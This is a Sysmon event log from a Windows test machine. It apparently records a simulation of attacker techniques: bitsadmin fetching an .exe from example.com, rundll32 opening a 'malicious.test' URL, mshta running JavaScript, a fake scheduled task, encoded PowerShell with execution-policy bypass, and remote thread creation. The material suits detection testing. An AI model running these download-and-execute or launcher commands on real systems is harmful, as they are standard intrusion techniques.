Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\regsvr32.exe|20eb212352f3412a\LinkDate
Details: 08/31/2073 04:13:54
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Pub
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.111
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\regsvr32.exe|20eb212352f3412a\Publisher
Details: microsoft corporation
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Path
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.111
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\regsvr32.exe|20eb212352f3412a\LowerCaseLongPath
Details: c:\windows\system32\regsvr32.exe
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.054
ProcessGuid: {3a35410f-927c-6928-a810-000000000b00}
ProcessId: 6452
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job1 http://example.com/file.exe C:\Temp\file1.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.017
ProcessGuid: {3a35410f-927c-6928-a610-000000000b00}
ProcessId: 5232
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:39 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:39.992
ProcessGuid: {3a35410f-927b-6928-a410-000000000b00}
ProcessId: 11432
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask1 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:39 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:39.965
ProcessGuid: {3a35410f-927b-6928-a210-000000000b00}
ProcessId: 6100
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask1 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:39 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:39.946
ProcessGuid: {3a35410f-927b-6928-a110-000000000b00}
ProcessId: 9244
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:39 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:39.888
ProcessGuid: {3a35410f-927b-6928-a010-000000000b00}
ProcessId: 8228
Image: C:\Windows\System32\SecurityHealthHost.exe
FileVersion: 4.18.1907.16384 (WinBuild.160101.0800)
Description: Windows Security Health Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SecurityHealthHost.exe
CommandLine: C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=BC84EF67269A2AEF02EBA5AA8FB69BEC,SHA256=08C05285CE0BA345A39C08D70D6686706CDCB847A220A1CA34F5BFECC8CD8857,IMPHASH=4E28FDA241BEFA94F219E0683850258F
ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00}
ParentProcessId: 848
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:39 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:39.763
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-927a-6928-9e10-000000000b00}
TargetProcessId: 1964
TargetImage: <unknown process>
NewThreadId: 9336
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:39 PM","13","Information","Registry value set:
RuleName: InvDB-Ver
EventType: SetValue
UtcTime: 2025-11-27 18:03:39.021
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\mshta.exe|1092efcd47a69416\BinProductVersion
Details: 11.0.19041.5794
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:39 PM","13","Information","Registry value set:
RuleName: InvDB-CompileTimeClaim
EventType: SetValue
UtcTime: 2025-11-27 18:03:39.021
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\mshta.exe|1092efcd47a69416\LinkDate
Details: 04/01/2014 20:13:07
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:39 PM","13","Information","Registry value set:
RuleName: InvDB-Pub
EventType: SetValue
UtcTime: 2025-11-27 18:03:39.021
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\mshta.exe|1092efcd47a69416\Publisher
Details: microsoft corporation
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:39 PM","13","Information","Registry value set:
RuleName: InvDB-Path
EventType: SetValue
UtcTime: 2025-11-27 18:03:39.021
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\mshta.exe|1092efcd47a69416\LowerCaseLongPath
Details: c:\windows\system32\mshta.exe
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:38 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:38.422
ProcessGuid: {3a35410f-927a-6928-9d10-000000000b00}
ProcessId: 7972
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test1') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:36 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:36.719
ProcessGuid: {3a35410f-9278-6928-9c10-000000000b00}
ProcessId: 7196
Image: C:\Windows\System32\LocationNotificationWindows.exe
FileVersion: 10.0.19041.5915 (WinBuild.160101.0800)
Description: Location Notification
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: LocationNotificationWindows.exe
CommandLine: ""C:\Windows\System32\LocationNotificationWindows.exe""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=78304DE7BC9427229F70FC0CCF7C0CF1,SHA256=82CFEF287D60D9F04E5F0E4FB915D71CC71C1AD260F90941F4ADEE515896BBE7,IMPHASH=BFB647E172E5CBBCE5676BA2E6097869
ParentProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ParentProcessId: 1532
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:33 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:33.981
ProcessGuid: {3a35410f-9272-6928-9610-000000000b00}
ProcessId: 8656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_5v0d0szp.pb1.ps1
CreationUtcTime: 2025-11-27 18:03:33.981
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:33 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:33.680
ProcessGuid: {3a35410f-9272-6928-9210-000000000b00}
ProcessId: 5440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_u0pbxryd.ssv.ps1
CreationUtcTime: 2025-11-27 18:03:33.680
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:33 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:33.336
ProcessGuid: {3a35410f-9275-6928-9b10-000000000b00}
ProcessId: 8784
Image: C:\Windows\System32\timeout.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: timeout - pauses command processing
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: timeout.exe
CommandLine: timeout  /t 1  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=100065E21CFBBDE57CBA2838921F84D6,SHA256=C8C350FAB1130644536DB6A84F605791367308B995079AD494D46A8C617C21D6,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: {3a35410f-9272-6928-9410-000000000b00}
ParentProcessId: 11972
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 183 & timeout /t 1 >nul 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:31 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:31.742
ProcessGuid: {3a35410f-9273-6928-9a10-000000000b00}
ProcessId: 1480
Image: C:\Windows\System32\timeout.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: timeout - pauses command processing
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: timeout.exe
CommandLine: timeout  /t 1  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=100065E21CFBBDE57CBA2838921F84D6,SHA256=C8C350FAB1130644536DB6A84F605791367308B995079AD494D46A8C617C21D6,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: {3a35410f-9270-6928-8910-000000000b00}
ParentProcessId: 9976
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 182 & timeout /t 1 >nul 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:31 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:31.741
ProcessGuid: {3a35410f-9271-6928-8b10-000000000b00}
ProcessId: 11096
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_cpjmcq5b.d4b.ps1
CreationUtcTime: 2025-11-27 18:03:31.741
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:31 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:31.337
ProcessGuid: {3a35410f-9273-6928-9810-000000000b00}
ProcessId: 13156
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:31 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:30.970
ProcessGuid: {3a35410f-9272-6928-9610-000000000b00}
ProcessId: 8656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 183'; Start-Sleep -Seconds 1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:30 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:30.769
ProcessGuid: {3a35410f-9270-6928-8610-000000000b00}
ProcessId: 3188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_x14e3erj.wca.ps1
CreationUtcTime: 2025-11-27 18:03:30.769
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:30 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:30.701
ProcessGuid: {3a35410f-9272-6928-9410-000000000b00}
ProcessId: 11972
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 183 & timeout /t 1 >nul 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:30 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:30.542
ProcessGuid: {3a35410f-926f-6928-8010-000000000b00}
ProcessId: 12488
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_niur1zwp.iiy.ps1
CreationUtcTime: 2025-11-27 18:03:30.542
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:30 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:30.111
ProcessGuid: {3a35410f-9272-6928-9210-000000000b00}
ProcessId: 5440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMQA4ADIAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:29 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:29.776
ProcessGuid: {3a35410f-926e-6928-7b10-000000000b00}
ProcessId: 7500
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_1wmlagjo.cqx.ps1
CreationUtcTime: 2025-11-27 18:03:29.774
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:29 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:29.769
ProcessGuid: {3a35410f-9271-6928-9010-000000000b00}
ProcessId: 8828
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:29 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:29.707
ProcessGuid: {3a35410f-9271-6928-8f10-000000000b00}
ProcessId: 9528
Image: C:\Windows\System32\timeout.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: timeout - pauses command processing
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: timeout.exe
CommandLine: timeout  /t 1  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=100065E21CFBBDE57CBA2838921F84D6,SHA256=C8C350FAB1130644536DB6A84F605791367308B995079AD494D46A8C617C21D6,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: {3a35410f-926f-6928-7e10-000000000b00}
ParentProcessId: 7736
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 181 & timeout /t 1 >nul 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
